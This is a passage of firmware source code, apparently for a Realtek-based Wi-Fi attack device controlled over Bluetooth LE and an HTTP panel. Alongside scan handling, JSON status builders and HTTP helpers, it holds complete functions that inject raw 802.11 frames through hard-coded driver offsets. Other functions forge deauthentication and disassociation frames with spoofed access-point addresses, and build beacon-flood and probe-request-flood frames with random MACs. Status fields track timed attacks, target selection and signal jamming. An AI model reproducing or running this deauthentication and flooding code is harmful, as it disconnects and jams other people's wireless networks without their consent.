  while (sentCount < MAX_LINES_PER_TICK) {
    if (!hasBleTxCreditHeadroom(connId, 2, 0)) {
      break;
    }
    if (!bleScanPush.beginSent) {
      const char *beginMsg = bleScanPush.isSync ? "{\"t\":\"sync_begin\"}" : "{\"t\":\"scan_begin\"}";
      if (!bleSendLineCstr(beginMsg, strlen(beginMsg), true, false)) {
        break;
      }
      bleScanPush.beginSent = true;
      bleScanPush.lastProgressAt = millis();
      sentCount++;
      continue;
    }

    if (bleScanPush.idx < bleScanPush.snap.size()) {
      const WiFiScanResult &ap = bleScanPush.snap[bleScanPush.idx];
      char escSsid[140];
      jsonEscapeTruncatedToBuf(ap.ssid.c_str(), escSsid, sizeof(escSsid), 96, "...");
      char line[256];
      int n = snprintf(line, sizeof(line),
                       "{\"t\":\"ap\",\"i\":%lu,\"s\":\"%s\",\"b\":\"%s\",\"c\":%u,\"r\":%d%s}",
                       (unsigned long)bleScanPush.idx,
                       escSsid,
                       ap.bssid_str.c_str(),
                       (unsigned)ap.channel,
                       (int)ap.rssi,
                       ap.selected ? ",\"sel\":1" : "");
      if (n > 0 && (size_t)n < sizeof(line)) {
        if (!bleSendLineCstr(line, (size_t)n, true, false)) {
          break;
        }
      }
      bleScanPush.idx++;
      bleScanPush.lastProgressAt = millis();
      sentCount++;
    } else {
      char endLine[48];
      int n = snprintf(endLine, sizeof(endLine),
                       bleScanPush.isSync ? "{\"t\":\"sync_end\",\"n\":%lu}" : "{\"t\":\"scan_end\",\"n\":%lu}",
                       (unsigned long)bleScanPush.snap.size());
      if (n > 0 && (size_t)n < sizeof(endLine)) {
        if (!bleSendLineCstr(endLine, (size_t)n, true, false)) {
          break;
        }
      }
      cancelBleScanPush();
      break;
    }
  }
}

void blePushScanResults(bool emitBegin, bool isSync) {
  uint8_t connId = 0;
  if (!isBleReadyToNotifySafe(connId)) {
    cancelBleScanPush();
    return;
  }
  bleScanPush.reset();
  bleScanPush.snap = snapshotScanResults();
  bleScanPush.active = true;
  bleScanPush.emitBegin = emitBegin;
  bleScanPush.isSync = isSync;
  bleScanPush.beginSent = !emitBegin;
  bleScanPush.idx = 0;
  bleScanPush.lastProgressAt = millis();
  pumpBleScanPush();
}

void blePushStatus(bool critical) {
  uint8_t connId = 0;
  if (!isBleReadyToNotifySafe(connId)) return;
  unsigned long remSec = 0;
  unsigned long nowMs = millis();
  if (timedAttackEnabled && (nowMs - attackStartTime < attackDuration)) {
    remSec = (attackDuration - (nowMs - attackStartTime) + 999) / 1000;
  } else if (timedSniffEnabled && (nowMs - sniffStartTime < sniffDuration)) {
    remSec = (sniffDuration - (nowMs - sniffStartTime) + 999) / 1000;
  }
  bool deauthSniffSnap = false;
  bool sniffingSnap = false;
  SniffMode modeSnap = SNIFF_STOP;
  int chSnap = WIFI_CHANNEL;
  rtw_enter_critical(NULL, NULL);
  deauthSniffSnap = deauth_sniff_enabled;
  sniffingSnap = isSniffing;
  modeSnap = currentMode;
  chSnap = currentChannel;
  rtw_exit_critical(NULL, NULL);

  char line[224];
  int n = snprintf(line, sizeof(line),
                   "{\"t\":\"st\",\"atk\":%d,\"dis\":%d,\"bcn\":%d,\"prb\":%d,\"jam\":%d,\"snf\":%d,\"snfOn\":%d,\"sMode\":%d,\"hop\":%d,\"ch\":%d,\"ok\":%lu,\"fail\":%lu,\"rem\":%lu}",
                   attack_enabled ? 1 : 0,
                   disassoc_enabled ? 1 : 0,
                   beacon_flood_enabled ? 1 : 0,
                   probe_flood_enabled ? 1 : 0,
                   signal_jam_enabled ? 1 : 0,
                   deauthSniffSnap ? 1 : 0,
                   sniffingSnap ? 1 : 0,
                   (int)modeSnap,
                   isHopping ? 1 : 0,
                   chSnap,
                   (unsigned long)tx_success_count,
                   (unsigned long)tx_fail_count,
                   remSec);
  if (n > 0 && (size_t)n < sizeof(line)) {
    bleSendLineCstr(line, (size_t)n, critical, !critical);
  }
}

void blePushInfo() {
  uint8_t connId = 0;
  if (!isBleReadyToNotifySafe(connId)) return;
  char cfgLine[160];
  int cn = snprintf(cfgLine, sizeof(cfgLine),
                    "{\"t\":\"cfg\",\"delay\":%lu,\"scan\":%lu,\"frames\":%lu,\"ch\":%d,\"sc\":%d,\"led\":%d,\"ap\":%d}",
                    cycle_delay,
                    scan_time,
                    num_send_frames,
                    start_channel,
                    scan_between_cycles ? 1 : 0,
                    USE_LED ? 1 : 0,
                    apEnabled ? 1 : 0);
  if (cn > 0 && (size_t)cn < sizeof(cfgLine)) {
    bleSendLineCstr(cfgLine, (size_t)cn, true, false);
  }

  // 动态 MTU 分片模式下固定发送单行完整 id（含 ssid/pass/ble），消除 Android 半同步写入旧值风险
  char escSsid[80], escPass[144], escBle[64], idLine[340];
  jsonEscapeToBuf(ap_ssid, escSsid, sizeof(escSsid));
  jsonEscapeToBuf(ap_pass, escPass, sizeof(escPass));
  jsonEscapeToBuf(ble_name, escBle, sizeof(escBle));
  int in = snprintf(idLine, sizeof(idLine),
                    "{\"t\":\"id\",\"ssid\":\"%s\",\"pass\":\"%s\",\"ble\":\"%s\"}",
                    escSsid, escPass, escBle);
  if (in > 0 && (size_t)in < sizeof(idLine)) {
    bleSendLineCstr(idLine, (size_t)in, true, false);
  }
}

//==========================================================
// Raw Frame Injection
//==========================================================
void wifi_tx_raw_frame(void* frame, size_t length) {
  if (frame == NULL || length == 0 || length > 1500) {
    tx_fail_count++;
    Serial.println("[TX ERROR] Invalid raw frame or length!");
    return;
  }
  if (!wifi_is_up(RTW_STA_INTERFACE) && !wifi_is_up(RTW_AP_INTERFACE)) {
    tx_fail_count++;
    Serial.println("[TX ERROR] Wi-Fi interface is not up!");
    return;
  }
  uint8_t *wlan_dev = rltk_wlan_info;
  if (wlan_dev == NULL) {
    tx_fail_count++;
    Serial.println("[TX ERROR] rltk_wlan_info dev is NULL!");
    return;
  }
  uint32_t **priv_slot = (uint32_t **)(wlan_dev + 0x10);
  uint32_t *priv_ptr = *priv_slot;
  if (priv_ptr == NULL) {
    tx_fail_count++;
    Serial.println("[TX ERROR] rltk_wlan_info priv_ptr is NULL!");
    return;
  }
  void *ptr = (void *)(*priv_ptr);
  if (ptr == NULL) {
    tx_fail_count++;
    Serial.println("[TX ERROR] rltk_wlan_info ptr is NULL!");
    return;
  }

  uint8_t *pxmitpriv = (uint8_t *)ptr + 0xae0;
  void *frame_control = alloc_mgtxmitframe(pxmitpriv);
  if (frame_control == NULL) {
    tx_fail_count++;
    Serial.println("[TX ERROR] alloc_mgtxmitframe returned NULL!");
    return;
  }

  // 先对底层 xmitbuf 指针判空再 memset / +0x28 偏移，失败时释放已分配资源避免泄漏
  uint8_t *frame_buf = *(uint8_t **)((uint8_t *)frame_control + 0x80);
  if (frame_buf == NULL) {
    tx_fail_count++;
    void *pxmitbuf = *(void **)((uint8_t *)frame_control + 0x84);
    if (pxmitbuf != NULL) {
      rtw_free_xmitbuf(pxmitpriv, pxmitbuf);
    }
    rtw_free_xmitframe(pxmitpriv, frame_control);
    Serial.println("[TX ERROR] frame_buf is NULL!");
    return;
  }

  update_mgntframe_attrib(ptr, (uint8_t *)frame_control + 8);
  memset(frame_buf, 0, 0x68);
  uint8_t *frame_data = frame_buf + 0x28;
  memcpy(frame_data, frame, length);
  *(uint32_t *)((uint8_t *)frame_control + 0x14) = (uint32_t)length;
  *(uint32_t *)((uint8_t *)frame_control + 0x18) = (uint32_t)length;
  int ret = dump_mgntframe(ptr, frame_control);
  if (ret == 0) {
    tx_success_count++;
  } else {
    tx_fail_count++;
    Serial.print("[TX ERROR] dump_mgntframe returned: ");
    Serial.println(ret);
  }
}

void wifi_tx_deauth_frame(const void* src_mac, const void* dst_mac, uint16_t reason) {
  DeauthFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  // Rotate sequence number (increment by 1 per frame, fragment=0)
  frame.sequence_number = (seq_num_counter++ << 4) & 0xFFF0;
  wifi_tx_raw_frame((void*)&frame, sizeof(DeauthFrame));
}

void wifi_tx_disassoc_frame(const void* src_mac, const void* dst_mac, uint16_t reason) {
  DisassocFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  // Rotate sequence number (increment by 1 per frame, fragment=0)
  frame.sequence_number = (seq_num_counter++ << 4) & 0xFFF0;
  wifi_tx_raw_frame((void*)&frame, sizeof(DisassocFrame));
}

//==========================================================
// Beacon Flood TX
//==========================================================
void wifi_tx_beacon_frame(const char* ssid, int ssid_len, uint8_t channel) {
  if (!ssid || ssid_len < 0) return;
  int safeLen = (ssid_len > 32) ? 32 : ssid_len;

  uint8_t buf[96];
  memset(buf, 0, sizeof(buf));
  int offset = 0;

  buf[offset++] = 0x80; buf[offset++] = 0x00;    // FC = Beacon
  offset += 2;                                    // duration = 0
  memset(&buf[offset], 0xFF, 6); offset += 6;    // DA = broadcast
  randomMAC(&buf[offset]); offset += 6;          // SA = random
  memcpy(&buf[offset], &buf[offset - 6], 6); offset += 6;  // BSSID = SA
  uint16_t seq = (seq_num_counter++ << 4) & 0xFFF0;
  buf[offset++] = seq & 0xFF; buf[offset++] = (seq >> 8) & 0xFF;

  unsigned long ts = millis();
  memcpy(&buf[offset], &ts, 4); offset += 8;      // timestamp (low 4B, high 4B zero)
  buf[offset++] = 0x64; buf[offset++] = 0x00;    // beacon interval = 100 TUs
  buf[offset++] = 0x01; buf[offset++] = 0x00;    // capability = ESS

  const int tailLen = (channel >= 36) ? 10 : 9;
  if (offset + 2 + safeLen + tailLen > (int)sizeof(buf)) return;

  buf[offset++] = 0x00;                           // SSID tag
  buf[offset++] = (uint8_t)safeLen;
  if (safeLen > 0) {
    memcpy(&buf[offset], ssid, (size_t)safeLen);
    offset += safeLen;
  }
  if (channel >= 36) {
    // 5GHz 802.11a/n OFDM Supported Rates (6, 9, 12, 18, 24, 36, 48, 54 Mbps)
    const uint8_t rates5g[] = {0x8C, 0x12, 0x98, 0x24, 0xB0, 0x48, 0x60, 0x6C};
    buf[offset++] = 0x01; buf[offset++] = sizeof(rates5g);
    memcpy(&buf[offset], rates5g, sizeof(rates5g));
    offset += sizeof(rates5g);
  } else {
    buf[offset++] = 0x03; buf[offset++] = 0x01; buf[offset++] = channel;  // 2.4GHz DS params
    // 2.4GHz 802.11b/g Supported Rates (1, 2, 5.5, 11 Mbps)
    buf[offset++] = 0x01; buf[offset++] = 0x04;
    buf[offset++] = 0x82; buf[offset++] = 0x84;
    buf[offset++] = 0x8B; buf[offset++] = 0x96;
  }

  wifi_tx_raw_frame(buf, (size_t)offset);
}

//==========================================================
// Probe Request Flood TX
//==========================================================
void wifi_tx_probe_req_frame(const char* ssid, int ssid_len) {
  if (!ssid || ssid_len < 0) return;
  int safeLen = (ssid_len > 32) ? 32 : ssid_len;
  int chSnap = getCurrentChannelSafe();

  uint8_t buf[96];
  memset(buf, 0, sizeof(buf));
  int offset = 0;

  buf[offset++] = 0x40; buf[offset++] = 0x00;    // FC = Probe Request
  offset += 2;                                    // duration = 0
  memset(&buf[offset], 0xFF, 6); offset += 6;    // DA = broadcast
  randomMAC(&buf[offset]); offset += 6;          // SA = random
  memset(&buf[offset], 0xFF, 6); offset += 6;    // BSSID = broadcast
  uint16_t seq = (seq_num_counter++ << 4) & 0xFFF0;
  buf[offset++] = seq & 0xFF; buf[offset++] = (seq >> 8) & 0xFF;

  const int tailLen = (chSnap >= 36) ? 10 : 6;
  if (offset + 2 + safeLen + tailLen > (int)sizeof(buf)) return;

  buf[offset++] = 0x00;                           // SSID tag
  buf[offset++] = (uint8_t)safeLen;
  if (safeLen > 0) {
    memcpy(&buf[offset], ssid, (size_t)safeLen);
    offset += safeLen;
  }
  if (chSnap >= 36) {
    const uint8_t rates5g[] = {0x8C, 0x12, 0x98, 0x24, 0xB0, 0x48, 0x60, 0x6C};
    buf[offset++] = 0x01; buf[offset++] = sizeof(rates5g);
    memcpy(&buf[offset], rates5g, sizeof(rates5g));
    offset += sizeof(rates5g);
  } else {
    buf[offset++] = 0x01; buf[offset++] = 0x04;
    buf[offset++] = 0x82; buf[offset++] = 0x84;
    buf[offset++] = 0x8B; buf[offset++] = 0x96;
  }

  wifi_tx_raw_frame(buf, (size_t)offset);
}

//==========================================================
// Sorting Helper
//==========================================================
void sortByChannel(std::vector<WiFiScanResult> &results) {
  for (size_t i = 0; i < results.size(); i++) {
    size_t min_idx = i;
    for (size_t j = i + 1; j < results.size(); j++) {
      if (results[j].channel < results[min_idx].channel) {
        min_idx = j;
      }
    }
    if (min_idx != i) {
      WiFiScanResult temp = results[i];
      results[i] = results[min_idx];
      results[min_idx] = temp;
    }
  }
}

//==========================================================
// Wi-Fi Scan Callback
//==========================================================
#define MAX_SCAN_RESULTS 64
volatile bool scan_done = false;
volatile bool scan_accepting = false;  // 扫描期间才允许驱动线程写入 scan_results

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  if (!scan_result) return RTW_SUCCESS;

  if (scan_result->scan_complete == 0) {
    rtw_scan_result_t *record = &scan_result->ap_details;
    if ((int)record->channel < start_channel) {
      return RTW_SUCCESS;
    }

    uint8_t ssidLen = (record->SSID.len > 32) ? 32 : record->SSID.len;
    char ssidBuf[33];
    sanitizeUtf8BytesToCstr((const uint8_t *)record->SSID.val, (size_t)ssidLen, ssidBuf, sizeof(ssidBuf), false);

    char bssid_str[20];
    snprintf(bssid_str, sizeof(bssid_str),
             "%02X:%02X:%02X:%02X:%02X:%02X",
             record->BSSID.octet[0], record->BSSID.octet[1], record->BSSID.octet[2],
             record->BSSID.octet[3], record->BSSID.octet[4], record->BSSID.octet[5]);

    if (!lockScanMutex(pdMS_TO_TICKS(500))) return RTW_SUCCESS;
    if (scan_accepting && scan_results.size() < MAX_SCAN_RESULTS) {
      WiFiScanResult result;
      result.ssid = String(ssidBuf);
      result.channel = record->channel;
      result.rssi = record->signal_strength;
      memcpy(&result.bssid, &record->BSSID, 6);
      result.bssid_str = String(bssid_str);
      scan_results.push_back(result);
    }
    unlockScanMutex();
  } else {
    if (lockScanMutex(pdMS_TO_TICKS(500))) {
      scan_accepting = false;
      scan_done = true;
      unlockScanMutex();
    } else {
      scan_accepting = false;
      scan_done = true;
    }
  }
  return RTW_SUCCESS;
}

//==========================================================
// Start a WiFi Scan
//==========================================================
int scanNetworks(bool emitBegin, bool isSync) {
  Serial.println("Starting WiFi scan...");
  if (lockScanMutex()) {
    scan_results.clear();
    scan_results.reserve(MAX_SCAN_RESULTS);
    scan_done = false;
    scan_accepting = true;
    unlockScanMutex();
  }
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    if (USE_LED) digitalWrite(LED_G, HIGH);
    // Wait for the driver to signal scan completion, using scan_time only as
    // a maximum-timeout guard so we never block forever.
    unsigned long start = millis();
    feedWatchdog();
    while (!scan_done && (millis() - start < scan_time)) {
      feedWatchdog();
      pollSerialInput();
      if (emergencyStopRequested || priorityStopPending) break;
      delay(50);
    }
    feedWatchdog();
    // 在 scanMutex 保护下关闭写入窗口、排序并同步选中目标，杜绝与延迟到达回调并发写 vector
    if (lockScanMutex()) {
      scan_accepting = false;
      sortByChannel(scan_results);
      if (target_mode && !target_aps.empty()) {
        for (size_t t = 0; t < target_aps.size(); t++) {
          for (size_t i = 0; i < scan_results.size(); i++) {
            if (memcmp(scan_results[i].bssid, target_aps[t].bssid, 6) == 0) {
              scan_results[i].selected = true;
              target_aps[t].channel = scan_results[i].channel;
              target_aps[t].rssi = scan_results[i].rssi;
              break;
            }
          }
        }
      }
      unlockScanMutex();
    }
    Serial.println("Scan completed!");
    blePushScanResults(emitBegin, isSync);
    if (USE_LED) digitalWrite(LED_G, LOW);
    return 0;
  } else {
    if (lockScanMutex()) {
      scan_accepting = false;
      unlockScanMutex();
    }
    if (USE_LED) digitalWrite(LED_G, LOW);
    Serial.println("Failed to start the scan!");
    return 1;
  }
}

void printScanResults() {
  std::vector<WiFiScanResult> snap = snapshotScanResults();
  Serial.println("Detected networks:");
  for (size_t i = 0; i < snap.size(); i++) {
    const char *freq = (snap[i].channel >= 36) ? "5GHz" : "2.4GHz";
    Serial.print(i);
    Serial.print("\tSSID: ");
    Serial.print(snap[i].ssid);
    Serial.print("\tBSSID: ");
    Serial.print(snap[i].bssid_str);
    Serial.print("\tChannel: ");
    Serial.print(snap[i].channel);
    Serial.print("\tRSSI: ");
    Serial.print(snap[i].rssi);
    Serial.print(" dBm\t");
    Serial.println(freq);
  }
}

//==========================================================
// Timed Attack
//==========================================================
void startTimedAttack(unsigned long durationMs) {
  timedAttackEnabled = true;
  attackStartTime    = millis();
  attackDuration     = durationMs;
  attack_enabled     = true;
}

void checkTimedAttack() {
  if (timedAttackEnabled && (millis() - attackStartTime > attackDuration)) {
    attack_enabled     = false;
    timedAttackEnabled = false;
    blePushStatus();
    Serial.println("[INFO] Timed attack ended.");
  }
  bool sniffNow = false;
  rtw_enter_critical(NULL, NULL);
  sniffNow = isSniffing;
  rtw_exit_critical(NULL, NULL);
  if (timedSniffEnabled && sniffNow && (millis() - sniffStartTime > sniffDuration)) {
    timedSniffEnabled = false;
    stopSniffing();
    blePushStatus();
    Serial.println("[INFO] Timed sniff ended.");
  }
}

bool shouldAbortCycle() {
  feedWatchdog();
  if (timedAttackEnabled && (millis() - attackStartTime > attackDuration)) {
    return true;
  }
  pollSerialInput();
  if (emergencyStopRequested || priorityStopPending) {
    return true;
  }
  if (hasQueuedStopInCmdRing()) {
    emergencyStopRequested = true;
    return true;
  }
  return false;
}

//==========================================================
// JSON Builders
//==========================================================
String jsonEscapeTruncated(const String &s, size_t maxEscapedBytes, const char *ellipsis) {
  size_t len = s.length();
  if (len == 0 || maxEscapedBytes == 0) return "";
  size_t bufCap = len * 6 + 16;
  if (maxEscapedBytes != (size_t)-1 && bufCap > maxEscapedBytes + 8) {
    bufCap = maxEscapedBytes + 8;
  }
  if (bufCap <= 384) {
    char stackBuf[384];
    jsonEscapeTruncatedToBuf(s.c_str(), stackBuf, sizeof(stackBuf), maxEscapedBytes, ellipsis);
    return String(stackBuf);
  }
  char *dynBuf = (char *)malloc(bufCap);
  if (!dynBuf) {
    char fallbackBuf[384];
    jsonEscapeTruncatedToBuf(s.c_str(), fallbackBuf, sizeof(fallbackBuf),
                             (maxEscapedBytes < 380) ? maxEscapedBytes : 380, ellipsis);
    return String(fallbackBuf);
  }
  jsonEscapeTruncatedToBuf(s.c_str(), dynBuf, bufCap, maxEscapedBytes, ellipsis);
  String out(dynBuf);
  free(dynBuf);
  return out;
}

String jsonEscape(const String &s) {
  return jsonEscapeTruncated(s, (size_t)-1, "");
}

String getScanResultsJSON() {
  std::vector<WiFiScanResult> snap = snapshotScanResults();
  String json;
  json.reserve(64 + snap.size() * 144);
  char headBuf[48];
  snprintf(headBuf, sizeof(headBuf), "{\"count\":%lu,\"networks\":[", (unsigned long)snap.size());
  json = headBuf;
  for (size_t i = 0; i < snap.size(); i++) {
    char escSsid[200];
    jsonEscapeToBuf(snap[i].ssid.c_str(), escSsid, sizeof(escSsid));
    char itemBuf[320];
    snprintf(itemBuf, sizeof(itemBuf),
             "%s{\"index\":%lu,\"ssid\":\"%s\",\"bssid\":\"%s\",\"channel\":%u,\"rssi\":%d,\"band\":\"%s\",\"selected\":%s}",
             (i > 0) ? "," : "",
             (unsigned long)i,
             escSsid,
             snap[i].bssid_str.c_str(),
             (unsigned)snap[i].channel,
             (int)snap[i].rssi,
             (snap[i].channel >= 36) ? "5GHz" : "2.4GHz",
             snap[i].selected ? "true" : "false");
    json += itemBuf;
  }
  json += "]}";
  return json;
}

String getStatusJSON() {
  size_t scanCount = 0;
  size_t targetCount = 0;
  bool targetModeSnap = false;
  getScanAndTargetCountsSafe(scanCount, targetCount, targetModeSnap);

  bool sniffingSnap = false;
  bool deauthSniffSnap = false;
  int chSnap = WIFI_CHANNEL;
  rtw_enter_critical(NULL, NULL);
  sniffingSnap = isSniffing;
  deauthSniffSnap = deauth_sniff_enabled;
  chSnap = currentChannel;
  rtw_exit_critical(NULL, NULL);
  bool bleConnectedSnap = isBleConnectedSafe();

  char escSsid[80], escBle[64];
  jsonEscapeToBuf(ap_ssid, escSsid, sizeof(escSsid));
  jsonEscapeToBuf(ble_name, escBle, sizeof(escBle));

  char remField[48] = "";
  unsigned long nowMs = millis();
  if (timedAttackEnabled) {
    unsigned long elapsed = nowMs - attackStartTime;
    unsigned long remaining = (attackDuration > elapsed) ? (attackDuration - elapsed) : 0;
    snprintf(remField, sizeof(remField), "\"timed_remaining\":%lu,", remaining);
  } else if (timedSniffEnabled) {
    unsigned long elapsed = nowMs - sniffStartTime;
    unsigned long remaining = (sniffDuration > elapsed) ? (sniffDuration - elapsed) : 0;
    snprintf(remField, sizeof(remField), "\"timed_remaining\":%lu,", remaining);
  }

  char buf[768];
  snprintf(buf, sizeof(buf),
           "{\"attack_enabled\":%s,\"disassoc_enabled\":%s,\"timed_attack\":%s,\"timed_sniff\":%s,"
           "\"sniffing\":%s,\"hopping\":%s,\"target_mode\":%s,\"scan_count\":%lu,\"target_count\":%lu,"
           "\"current_channel\":%d,\"beacon_flood\":%s,\"probe_flood\":%s,\"signal_jam\":%s,"
           "\"deauth_sniff\":%s,\"tx_ok\":%lu,\"tx_fail\":%lu,\"ssid\":\"%s\",\"ble_name\":\"%s\","
           "\"ap_enabled\":%s,\"ble_connected\":%s,%s\"uptime\":%lu}",
           attack_enabled ? "true" : "false",
           disassoc_enabled ? "true" : "false",
           timedAttackEnabled ? "true" : "false",
           timedSniffEnabled ? "true" : "false",
           sniffingSnap ? "true" : "false",
           isHopping ? "true" : "false",
           targetModeSnap ? "true" : "false",
           (unsigned long)scanCount,
           (unsigned long)targetCount,
           chSnap,
           beacon_flood_enabled ? "true" : "false",
           probe_flood_enabled ? "true" : "false",
           signal_jam_enabled ? "true" : "false",
           deauthSniffSnap ? "true" : "false",
           (unsigned long)tx_success_count,
           (unsigned long)tx_fail_count,
           escSsid,
           escBle,
           apEnabled ? "true" : "false",
           bleConnectedSnap ? "true" : "false",
           remField,
           nowMs);
  return String(buf);
}

String getInfoJSON() {
  char escSsid[80], escBle[64];
  jsonEscapeToBuf(ap_ssid, escSsid, sizeof(escSsid));
  jsonEscapeToBuf(ble_name, escBle, sizeof(escBle));

  // 决策 C：HTTP /api/info 不返回明文 ap_pass，仅留空提示未修改
  char buf[448];
  snprintf(buf, sizeof(buf),
           "{\"cycle_delay\":%lu,\"scan_time\":%lu,\"num_frames\":%lu,\"start_channel\":%d,"
           "\"scan_between_cycles\":%s,\"led\":%s,\"ssid\":\"%s\",\"pass\":\"\",\"ble_name\":\"%s\",\"channel\":%d}",
           cycle_delay,
           scan_time,
           num_send_frames,
           start_channel,
           scan_between_cycles ? "true" : "false",
           USE_LED ? "true" : "false",
           escSsid,
           escBle,
           WIFI_CHANNEL);
  return String(buf);
}

String getLogsJSON() {
  // Allocate transient snapshot on heap (zero static .bss footprint, zero 4KB main_task stack bloat)
  char *logSnapshot = (char *)malloc((size_t)WEB_LOG_HISTORY_SIZE * LOG_STR_LEN);
  uint8_t count = 0;
  bool sniffingSnap = false;
  SniffMode modeSnap = SNIFF_STOP;
  bool hoppingSnap = false;
  int chSnap = WIFI_CHANNEL;

  // 单次临界区内原子拷贝日志快照（禁止在临界区内做 String 堆分配），出锁后再拼装 JSON
  rtw_enter_critical(NULL, NULL);
  sniffingSnap = isSniffing;
  modeSnap = currentMode;
  hoppingSnap = isHopping;
  chSnap = currentChannel;
  if (logSnapshot != nullptr) {
    count = webLogCount;
    if (count > WEB_LOG_HISTORY_SIZE) count = WEB_LOG_HISTORY_SIZE;
    uint8_t startIdx = (webLogHead + WEB_LOG_HISTORY_SIZE - count) % WEB_LOG_HISTORY_SIZE;
    for (uint8_t i = 0; i < count; i++) {
      uint8_t slot = (startIdx + i) % WEB_LOG_HISTORY_SIZE;
      char *dst = logSnapshot + ((size_t)i * LOG_STR_LEN);
      size_t cp = strlen(webLogHistory[slot]) + 1;
      if (cp > LOG_STR_LEN) cp = LOG_STR_LEN;
      memcpy(dst, webLogHistory[slot], cp);
      dst[LOG_STR_LEN - 1] = '\0';
    }
  }
  rtw_exit_critical(NULL, NULL);

  String json;
  json.reserve(96 + (size_t)count * 160);
  char hdrBuf[96];
  snprintf(hdrBuf, sizeof(hdrBuf),
           "{\"sniffing\":%s,\"mode\":%d,\"hopping\":%s,\"channel\":%d,\"logs\":[",
           sniffingSnap ? "true" : "false",
           (int)modeSnap,
           hoppingSnap ? "true" : "false",
           chSnap);
  json = hdrBuf;
  for (uint8_t i = 0; i < count; i++) {
    char escLog[256];
    const char *src = logSnapshot + ((size_t)i * LOG_STR_LEN);
    jsonEscapeToBuf(src, escLog, sizeof(escLog));
    if (i > 0) json += ",";
    json += "\"";
    json += escLog;
    json += "\"";
  }
  if (logSnapshot != nullptr) {
    free(logSnapshot);
  }
  json += "]}";
  return json;
}

//==========================================================
// HTTP Helpers
//==========================================================
static int formatHttpHeaderBuf(int code, const char *contentType, int contentLength, char *out, size_t outSize) {
  const char *reason = "OK";
  switch (code) {
    case 200: reason = "OK"; break;
    case 400: reason = "Bad Request"; break;
    case 403: reason = "Forbidden"; break;
    case 404: reason = "Not Found"; break;
    case 405: reason = "Method Not Allowed"; break;
    case 408: reason = "Request Timeout"; break;
    case 413: reason = "Payload Too Large"; break;
    case 500: reason = "Internal Server Error"; break;
    case 503: reason = "Service Unavailable"; break;
    default:  reason = "OK"; break;
  }
  // 决策 C：同源访问，不返回 Access-Control-Allow-Origin: *
  if (contentLength >= 0) {
    return snprintf(out, outSize,
                    "HTTP/1.1 %d %s\r\nContent-Type: %s\r\nCache-Control: no-store\r\nContent-Length: %d\r\nConnection: close\r\n\r\n",
                    code, reason, contentType ? contentType : "text/plain", contentLength);
  }
  return snprintf(out, outSize,
                  "HTTP/1.1 %d %s\r\nContent-Type: %s\r\nCache-Control: no-store\r\nConnection: close\r\n\r\n",
                  code, reason, contentType ? contentType : "text/plain");
}

String httpHeader(int code, const String &contentType, int contentLength = -1) {
  char buf[256];
  formatHttpHeaderBuf(code, contentType.c_str(), contentLength, buf, sizeof(buf));
  return String(buf);
}

bool sendLargeText(int clientSock, const char *data, size_t totalLen) {
  if (clientSock < 0 || (!data && totalLen > 0)) return false;
  const size_t CHUNK_SIZE = 1024;
  size_t sent = 0;
  unsigned long lastProgressMs = millis();
  while (sent < totalLen) {
    feedWatchdog();
    size_t toSend = (totalLen - sent > CHUNK_SIZE) ? CHUNK_SIZE : (totalLen - sent);
    int r = lwip_send(clientSock, data + sent, toSend, 0);
    if (r > 0) {
      sent += (size_t)r;
      lastProgressMs = millis();
      if (sent < totalLen) {
        delay(2);  // give lwIP time to drain its send window
      }
    } else {
      int err = (r < 0) ? lwip_getsocklasterr(clientSock) : 0;
      if (r < 0 && (err == EAGAIN || err == EWOULDBLOCK || err == EINTR) &&
          (millis() - lastProgressMs < 1500)) {
        delay(5);
        continue;
      }
      return false;
    }
  }
  return (sent == totalLen);
}

bool sendHttpResponse(int clientSock, int code, const char *contentType, const char *body, size_t bodyLen) {
  char hdrBuf[256];
  int hn = formatHttpHeaderBuf(code, contentType, (int)bodyLen, hdrBuf, sizeof(hdrBuf));
  if (hn <= 0 || (size_t)hn >= sizeof(hdrBuf)) return false;
  if (!sendLargeText(clientSock, hdrBuf, (size_t)hn)) {
    return false;
  }
  if (bodyLen > 0 && body != nullptr) {
    return sendLargeText(clientSock, body, bodyLen);
  }
  return true;
}

String getHttpRequestLine(const String &request) {
  int lineEnd = request.indexOf('\n');
  String firstLine = (lineEnd >= 0) ? request.substring(0, lineEnd) : request;
  if (firstLine.endsWith("\r")) {
    firstLine.remove(firstLine.length() - 1);
  }
  return firstLine;
}

String parsePath(const String &request) {
  String firstLine = getHttpRequestLine(request);
  int start = firstLine.indexOf(' ');
  if (start < 0) return "/";
  start++;
  while (start < (int)firstLine.length() && firstLine.charAt(start) == ' ') start++;
  int end = firstLine.indexOf(' ', start);
  if (end < 0) end = firstLine.length();
  if (end <= start) return "/";
  return firstLine.substring(start, end);
}

String parseMethod(const String &request) {
  String firstLine = getHttpRequestLine(request);
  int end = firstLine.indexOf(' ');
  if (end <= 0) return "";
  String method = firstLine.substring(0, end);
  method.toUpperCase();
  return method;
}

String parseBody(const String &request) {
  int idx = request.indexOf("\r\n\r\n");
  if (idx >= 0) return request.substring(idx + 4);
  idx = request.indexOf("\n\n");
  if (idx >= 0) return request.substring(idx + 2);
  return "";
}

// 1 = valid Content-Length, 0 = not present, -1 = malformed/negative
int parseContentLengthHeader(const String &headers, long &outLen) {
  outLen = 0;
  int pos = 0;
  int total = (int)headers.length();
  while (pos < total) {
    int nl = headers.indexOf('\n', pos);
    String line = (nl >= 0) ? headers.substring(pos, nl) : headers.substring(pos);
    if (line.endsWith("\r")) line.remove(line.length() - 1);
    if (startsWithIgnoreCase(line, "Content-Length:")) {
      String valStr = line.substring(15);
      valStr.trim();
      long parsed = -1;
      if (!parseStrictLong(valStr, parsed) || parsed < 0) {
        return -1;
      }
      outLen = parsed;
      return 1;
    }
    if (nl < 0) break;
    pos = nl + 1;
  }
  return 0;
}

String urlDecode(const String &s) {
  String out;
  out.reserve(s.length());
  for (size_t i = 0; i < s.length(); i++) {
    char c = s[i];
    if (c == '+') {
      out += ' ';
    } else if (c == '%' && i + 2 < s.length() &&
               isxdigit((unsigned char)s[i + 1]) &&
               isxdigit((unsigned char)s[i + 2])) {
      char hex[3] = {s[i + 1], s[i + 2], '\0'};
      unsigned long val = strtoul(hex, nullptr, 16);
      // 过滤 %00 空字节注入
